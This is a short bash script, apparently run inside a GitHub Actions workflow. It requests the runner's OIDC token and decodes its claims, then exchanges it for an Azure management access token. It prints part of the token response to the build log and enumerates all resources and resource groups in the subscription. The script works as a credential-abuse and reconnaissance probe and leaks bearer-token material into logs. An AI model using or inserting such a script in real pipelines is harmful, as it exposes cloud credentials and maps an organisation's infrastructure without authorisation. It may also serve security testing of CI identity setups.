#!/usr/bin/env bash
echo "===ENV==="
echo "CLIENT=$AZURE_CLIENT_ID"
echo "TENANT=$AZURE_TENANT_ID"
echo "SUB=$AZURE_SUBSCRIPTION_ID"
echo "===OIDC==="
OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "oidc_len=${#OIDC}"
echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{sub,aud,iss,repository,event_name,ref}' 2>/dev/null
tok(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC"; }
echo "===MGMT TOKEN==="
MR=$(tok "https://management.azure.com/.default"); echo "$MR" | head -c 400; echo
MT=$(echo "$MR" | jq -r .access_token)
H="Authorization: Bearer $MT"
echo "===RESOURCES==="
curl -s -H "$H" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01" | jq -c '.value[]? | {name,type,location}'
echo "===RGs==="
curl -s -H "$H" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourcegroups?api-version=2021-04-01" | jq -c '.value[]?.name'
